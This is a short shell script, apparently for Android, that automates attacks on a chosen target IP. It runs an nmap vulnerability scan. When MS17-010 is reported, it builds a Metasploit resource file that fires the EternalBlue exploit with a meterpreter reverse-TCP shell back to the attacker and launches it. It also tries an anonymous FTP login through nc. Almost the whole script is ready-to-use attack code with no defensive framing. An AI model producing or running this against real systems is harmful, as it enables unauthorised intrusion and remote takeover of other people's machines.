#!/bin/sh

#CHANGE IP TO YOUR TARGET
TARGET="192.168.1.1"
OUTPUT="/storage/emulated/0/Download/scan_result.txt"

echo "[+] Scanning $TARGET for open ports and vulnerable services..."
nmap -sV --script vuln -oN $OUTPUT $TARGET

echo "[+] Parsing result for known vulnerabilities..."

# Check if EternalBlue (MS17-010) is present
if grep -q "smb-vuln-ms17-010" "$OUTPUT"; then
    echo "[!] MS17-010 (EternalBlue) detected! Launching exploit..."
    
    cat > exploit.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set LHOST 192.168.1.1 #CHANGE THIS TO YOUR IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
EOF

    msfconsole -r exploit.rc
    exit
fi

# Check for Anonymous FTP login
if grep -q "21/tcp.*ftp" "$OUTPUT"; then
    echo "[!] FTP service found. Trying anonymous login exploit..."
    echo -e "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc $TARGET 21
fi

echo "[+] Automation complete. Output saved to your Downloads folder."